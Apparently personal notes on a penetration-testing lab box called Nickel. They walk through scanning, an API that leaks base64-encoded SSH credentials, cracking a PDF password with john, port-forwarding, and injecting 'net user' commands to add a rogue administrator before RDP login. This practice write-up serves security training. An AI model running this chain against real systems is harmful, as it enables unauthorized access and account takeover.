# NMAP 

```
sudo nmap -sC -sV 192.168.194.99 -oN nmap-nickel
```

There are access creds 

```
ariah / NowiseSloopTheory139
```

![[PG/Windows/attachments/Pasted image 20250709121932.png]]


# FTP 

```
ftp 192.168.194.99
```

Anonymous login didn't work. No default creds for Filezilla 

![[PG/Windows/attachments/Pasted image 20250709122140.png]]


# SMB 

Domain: 
```
nickel
```
![[PG/Windows/attachments/Pasted image 20250709122910.png]]

Boo 

![[PG/Windows/attachments/Pasted image 20250709123147.png]]

# RPC 

![[PG/Windows/attachments/Pasted image 20250709123256.png]]
- nope 

# Web (80)

I can't see the site 

![[PG/Windows/attachments/Pasted image 20250709123457.png]]


# Web (8089)

![[PG/Windows/attachments/Pasted image 20250709123541.png]]
- here we go

## Ferox 

```
feroxbuster -u http://nickel:8089/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Can't really interact with the site while ferox is going 


![[PG/Windows/attachments/Pasted image 20250709123934.png]]
- nothing here 

The web page tried to go here...I clicked "list current deployments"

![[PG/Windows/attachments/Pasted image 20250709124018.png]]

![[PG/Windows/attachments/Pasted image 20250709124639.png]]

Try to curl the site 

```
curl -i http://192.168.194.99:33333/list-current-deployments
```

![[PG/Windows/attachments/Pasted image 20250709130004.png]]

Can we POST ?

```
curl -i http://192.168.194.99:33333/list-current-deployments -X POST
```

![[PG/Windows/attachments/Pasted image 20250709130106.png]]
- length required

Add content length 

```
 curl -i http://192.168.194.99:33333/list-current-deployments -X POST -H 'Content-Length: 0'
```

![[PG/Windows/attachments/Pasted image 20250709132657.png]]
- Not implemented response 


Try another endpoint 

```
curl -i http://192.168.194.99:33333/list-running-procs -X POST -H 'Content-Length: 0'
```


Here we can see the list of running processes 

![[PG/Windows/attachments/Pasted image 20250709132903.png]]

Including an ssh process with user credentials

![[PG/Windows/attachments/Pasted image 20250709132951.png]]

Creds

```
ariah:Tm93aXNlU2xvb3BUaGVvcnkxMzkK
```

Check final endpoint before moving on. 



# SSH in as Ariah

```
ssh ariah@192.168.194.99
```

Is this password encoded?

![[PG/Windows/attachments/Pasted image 20250709133211.png]]

Yeah, it was base64

![[PG/Windows/attachments/Pasted image 20250709133422.png]]
- decoded in cyberchef 

```
NowiseSloopTheory139
```


Retrying ssh and we're in 

![[PG/Windows/attachments/Pasted image 20250709133542.png]]

![[PG/Windows/attachments/Pasted image 20250709133616.png]]

```
whoami /priv
```

![[PG/Windows/attachments/Pasted image 20250709133726.png]]

This makes me immediately want to check for hijackable binaries.. 

```
wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """
```

![[PG/Windows/attachments/Pasted image 20250709133928.png]]
- boo

Check for .txt files 
```
dir /s *.txt
```

There's an ftp folder with an Infrastructure.pdf that may have some interesting info 

![[PG/Windows/attachments/Pasted image 20250709134133.png]]


We can try to view this file by re-using these creds with ftp 

```
ftp 192.168.194.99
```

Ya that worked 

![[PG/Windows/attachments/Pasted image 20250709141700.png]]

Grab this file 

![[PG/Windows/attachments/Pasted image 20250709141728.png]]

Go to open pdf but it's pass protected 

![[PG/Windows/attachments/Pasted image 20250709141807.png]]
- retrying ariah's creds 
- didn't work - not surprised 


# PDF2JJOHN

Let's run PDF2John and try to crack the pdf password.

```
pdf2john Infrastructure.pdf > pdf.hash
```
![[PG/Windows/attachments/Pasted image 20250709141945.png]]

## Crack it

```
john --wordlist=/usr/share/wordlists/rockyou.txt --rules=best64 pdf.hash
```

![[PG/Windows/attachments/Pasted image 20250709142628.png]]

```
ariah4168
```

Let's unlock the doc

![[PG/Windows/attachments/Pasted image 20250709142721.png]]

This is juicy.

Added these to /etc/hosts but of course it doesn't work.. Maybe curl again from the ariah ssh connection 

```
curl -i http://nickel-backup/
```

^ wrong path 

Trying 

```
netstat -ano
```

![[PG/Windows/attachments/Pasted image 20250709143743.png]]

```
curl http://127.0.0.1/
```
![[PG/Windows/attachments/Pasted image 20250709143848.png]]

```
ssh -L 33333:127.0.0.1:33333 ariah@192.168.194.99 -N
```

![[PG/Windows/attachments/Pasted image 20250709144914.png]]

NowiseSloopTheory139


![[PG/Windows/attachments/Pasted image 20250709144842.png]]

Okay, well at least I set that up properly

So  this box is supposed to have port 80 open and it's not open yay.

this should happen

![[PG/Windows/attachments/Pasted image 20250709150640.png]]

Can try this to create new admin user 

```
#To create a user named api with a password of Dork123!
net user api Dork123! /add

#To add to the administrator and RDP groups
net localgroup Administrators api /add
net localgroup 'Remote Desktop Users' api /add
```

URL encode these here 

https://meyerweb.com/eric/tools/dencoder/

```
net%20user%20api%20Dork123!%20%2Fadd

net%20localgroup%20Administrators%20api%20%2Fadd

net%20localgroup%20%27Remote%20Desktop%20Users%27%20api%20%2Fadd
```


Send these via api 

![[PG/Windows/attachments/Pasted image 20250709150832.png]]

Check new user 

```
net users
```

![[PG/Windows/attachments/Pasted image 20250709150909.png]]

# RDP in 

```
xfreerdp /cert:ignore /dynamic-resolution +clipboard /u:'api' /p:'Dork123!' /v:NICKEL
```


Get the flag 

![[PG/Windows/attachments/Pasted image 20250709151001.png]]

Maybe this could help

```
xfreerdp3 /cert:ignore /dynamic-resolution +clipboard /u:'ariah' /p:'NowiseSloopTheory139' /v:NICKEL /sec:rdp
```

